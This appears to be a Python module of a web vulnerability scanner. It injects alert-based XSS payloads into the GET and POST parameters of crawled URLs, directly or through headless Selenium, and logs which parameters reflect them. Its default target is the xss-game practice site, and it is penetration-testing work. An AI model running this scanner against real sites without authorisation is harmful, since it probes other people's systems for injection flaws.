import threading
from urllib.parse import urlparse, quote
import requests
import selenium
import logger
import time
import json

GET = "GET "
POST = "POST"

PAYLOADS = ['<script>alert("{}")</script>', '<img src="X" onerror="alert(\'{}\')">']
attack_cnt = 0
ATTACK_DIR = "./attack"
SCAN_DIR = "./scan"
ORIGIN = None
DROP_DICT = {True:"○", False:"●"}
FAST_ATTACK = None
VERBOSE = False
thread_num = 0
i = 0
# p1 = re.compile('<script>alert\\(\"test_XSS[0-9]+\"\\)<\\/script>')
# p2 = re.compile('<img src="X" onerror="alert\\(\'test_XSS[0-9]+\'\\)">')

# def is_match(payload):
#     if p1.match(payload) or p2.match(payload): return True
#     return False

def set_payload(payload):
    global attack_cnt
    attack_cnt += 1
    return payload.format("test_XSS"+str(attack_cnt))

def url_repair(url):
    return urlparse(url).netloc.replace(":", "..")

def read_urls():
    ret = []
    with open(f"./{SCAN_DIR}/{ORIGIN}.txt", "r") as f:
        for i in f.readlines():
            ret.append(eval(i))

    return ret

def re_cookies(res, cookies):
    for i in res.headers.get("Set-Cookie", "").split(";"):
        if '=' not in i: continue
        k, v = i.split("=")
        cookies[k] = v


def attack(url, cookies={}, selenium=False, fast_attack=True, v=False, ss=False):
    global ORIGIN, FAST_ATTACK, VERBOSE

    logger.title("REFLECTED XSS")

    VERBOSE = v
    FAST_ATTACK = fast_attack
    ORIGIN = url_repair(url)
    with open(f"./{ATTACK_DIR}/{ORIGIN}.txt", "w") as f: f.write("")
    with open(f"./result/reflected/{ORIGIN}.txt", 'w') as f: f.write("")
    urls = read_urls()
    if selenium:
        # logger.error("개발중: 쿠키 문제, redirect to requests attack")
        attack_by_selenium(url, urls, cookies, ss)
        return
    logger.info("FAST_ATTACK:", FAST_ATTACK)
    for i in urls:
        if i[1] == GET: do = get
        else: do = post
        for j in i[2]:
            if FAST_ATTACK:
                # logger.debug("attack!")
                t = threading.Thread(target=attack_1, args=(i, j, do, cookies))
                t.daemon = True
                t.start()
            else:
                attack_1(i, j, do, cookies)
            
        for j in i[3]:
            if FAST_ATTACK:
                # logger.debug("attack!")
                t = threading.Thread(target=attack_2, args=(i, j, do, cookies))
                t.daemon = True
                t.start()
            else:
                attack_2(i, j, do, cookies)
    while thread_num != 0: time.sleep(0.5)

def attack_1(i, j, do, cookies):
    global thread_num
    thread_num += 1
    try:
        params = i[2].copy()
        for payload in PAYLOADS:
            payload = set_payload(payload)
            params[j] = payload
            try: res = do(i[0], params=params, data=i[3], cookies=cookies, query_name=j)
            except KeyboardInterrupt: raise KeyboardInterrupt
            except: continue
            re_cookies(res, cookies)
            # logger.attack(res.text)
            if payload in res.text:
                # logger.find(i[1], res.status_code, i[0], f"{j}={payload}")
                # with open(f"./result/reflected/{ORIGIN}.txt", "a") as f:
                print_find(i[1], res.status_code, i[0], j, payload)

    except Exception as e:
        logger.error(e)
    thread_num -= 1


def attack_2(i, j, do, cookies):
    global thread_num
    thread_num += 1
    try:
        data = i[3].copy()
        for payload in PAYLOADS:
            payload = set_payload(payload)
            data[j] = payload
            try: res = do(i[0], params=i[2], data=data, cookies=cookies, query_name=j)
            except KeyboardInterrupt: raise KeyboardInterrupt
            except: continue
            re_cookies(res, cookies)
            if payload in res.text:
                # logger.find(i[1], res.status_code, i[0], f"{j}={payload}")
                print_find(i[1], res.status_code, i[0], j, payload)
    except:
        pass
    thread_num -= 1

def save(*argv, query_name):
    with open(f"./{ATTACK_DIR}/{ORIGIN}.txt", "a") as f:
        f.write(str((attack_cnt, query_name, argv))+"\n")

def post(url, params, data, cookies={}, query_name=None):
    res = requests.post(url, params=params, data=data, cookies=cookies)
    save(POST, url, params, data, cookies, query_name=query_name)
    if VERBOSE: logger.attack(DROP_DICT[res.status_code!=200], res.status_code, POST, url, params, data, cookies)
    else: logger.attack(DROP_DICT[res.status_code!=200], res.status_code, POST, url)
    return res

def get(url, params, data, cookies={}, query_name=None):
    # logger.attack(url, params, data, cookies)
    # save(GET, url, params, data, cookies)
    # return requests.get(url, params=params, data=data, cookies=cookies)

    res = requests.get(url, params=params, data=data, cookies=cookies)
    save(GET, url, params, data, cookies, query_name=query_name)
    if VERBOSE: logger.attack(DROP_DICT[res.status_code!=200], res.status_code, GET, url, params, data, cookies)
    else: logger.attack(DROP_DICT[res.status_code!=200], res.status_code, GET, url)
    return res

def attack_by_selenium(url, urls, cookies, ss):
    print("\nATTACK BY SELENIUM")
    init_selenium_module()
    driver = get_driver(url, cookies, ss)
    # input()
    for i in urls:
        data = i[3].copy()
        for j in i[2]:
            params = i[2].copy()
            in_attack_by_selenium(driver, params, data, cookies, i, j, method=GET)
        params = i[2].copy()
        for j in i[3]:
            data = i[3].copy()
            in_attack_by_selenium(driver, params, data, cookies, i, j, method=POST)
            # for payload in PAYLOADS:
            #     payload = set_payload(payload)
            #     data[j] = payload
            #     res = driver.request(i[1], i[0], params=params, data=data)
            #     driver.implicitly_wait(5)
            #     # logger.debug(i[0], i[2], i[3])
            #     # if payload in res.text: logger.find(i[1], res.status_code, i[0], f"{j}={payload}")
            #     if payload in driver.page_source: logger.find(i[1], res.status_code, i[0], f"{j}={payload}")

    driver.quit()

# def get_script_to_go(method, url, params, data):

def in_attack_by_selenium(driver, params, data, cookies, i, j, method):
    t_params = params.copy()
    t_data = data.copy()
    for payload in PAYLOADS:
        try:
            params = t_params.copy()
            data = t_data.copy()
            payload = set_payload(payload)
            if method == GET: params[j] = payload
            else: data[j] = payload
            # res = driver.request(i[1], i[0], params=params, data=i[3])
            # res = driver.execute_script(get_script_to_go(i[0], i[1], params, i[3]))
            url_tmp = i[0]
            method = i[1]
            if params:
                # print(params)
                url_tmp += "?"
                for k ,v in params.items():
                    url_tmp += f"{quote(k)}={quote(v)}&"
                url_tmp = url_tmp[:-1]
            if data:
                ret = f'<form method="POST" action="{url_tmp}" name="to_submit">'
                for k, v in data.items():
                    ret += f'<input type="hidden" name="{quote(k)}" value="{quote(v)}">'
                ret += "</form><script>document.to_submit.submit();</script>"
                driver.execute_script(f"document.write('{ret}');")
            else:
                driver.get(url_tmp)
            driver.implicitly_wait(5)
            # time.sleep(0.2)
            # input()

            # driver.implicitly_wait(5)
            # driver.get(i[0])
            # driver.implicitly_wait(5)
            # logger.debug(i[0], i[2], i[3])
            # logger.debug(driver.page_source)
            # logger.debug(driver.get_cookies()) #[{'domain': 'xss-game.appspot.com', 'expiry': 1658493295, 'httpOnly': True, 'name': 'level1', 'path': '/', 'secure': False, 'value': 'f148716ef4ed1ba0f192cde4618f8dc5'}]
            flag = 0
            try:
                while 1:
                    alert = driver.switch_to_alert()
                    if is_payload(alert.text): flag = 1
                    # input()
                    alert.accept()
                    # print('accepted!')
            except selenium.common.exceptions.NoAlertPresentException:
                pass

            # logger.debug("test!")
            status_code = get_status(driver)
            if flag:
                # logger.find(method, status_code, i[0], f"{j}={payload}")
                print_find(method, status_code, i[0], j, payload)
            save(method, i[0], params, data, cookies, query_name=j)
            if VERBOSE: logger.attack(DROP_DICT[status_code!=200], status_code, i[1], i[0], params, data, driver.get_cookies())
            else: logger.attack(DROP_DICT[status_code!=200], status_code, i[1], i[0])
            # if attack_cnt == 12: input()
            # if payload in res.text: logger.find(i[1], res.status_code, i[0], f"{j}={payload}")
            # if payload in driver.page_source: logger.find(i[1], status_code, i[0], f"{j}={payload}")
            # input()
            # print("end!")
        except KeyboardInterrupt: raise KeyboardInterrupt
        except Exception as e:
            logger.error(e)

def is_payload(text):
    if "test_XSS" in text: return True
    return False

# https://stackoverflow.com/questions/5799228/how-to-get-status-code-by-using-selenium-py-python-code
def get_status(driver):
    logs = driver.get_log("performance")
    for log in logs:
        if log['message']:
            d = json.loads(log['message'])
            try:
                content_type = 'text/html' in d['message']['params']['response']['headers']['content-type']
                response_received = d['message']['method'] == 'Network.responseReceived'
                if content_type and response_received:
                    return d['message']['params']['response']['status']
            except:
                pass

def get_driver(url, cookies, ss):
    webdriver_options = webdriver.ChromeOptions()
    if not ss:
        webdriver_options.add_argument('headless')
        webdriver_options.add_argument("disable-gpu")

    capabilities = DesiredCapabilities.CHROME.copy()
    capabilities['goog:loggingPrefs'] = {'performance': 'ALL'}

    driver = webdriver.Chrome(executable_path='./chrome/chromedriver.exe', options=webdriver_options, desired_capabilities=capabilities)
    driver.get(url)
    driver.implicitly_wait(5)
    # print(cookies)
    for cookie in cookies:
        # driver.add_cookie({'name':cookie, 'value':cookies[cookie], 'domain':urlparse(url).netloc})
        driver.add_cookie({'name':cookie, 'value':cookies[cookie]})
        # print(urlparse(url).netloc)
        # driver.execute_script(f"document.cookie = '{cookie}:{cookies[cookie]}'")

    return driver

def init_selenium_module():
    global webdriver, DesiredCapabilities, By
    from selenium import webdriver
    from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
    from selenium.webdriver.common.by import By
    # from seleniumrequests import Chrome

def print_find(method, status_code, url, param_name, payload):
    logger.find(method, status_code, url, param_name, payload)
    with open(f"./result/reflected/{ORIGIN}.txt", "a") as f:
        f.write(str({'method':method, 'status_code':status_code, 'url':url, 'param_name':param_name, 'payload':payload})+"\n")

if __name__ == "__main__":
    attack("http://xss-game.appspot.com")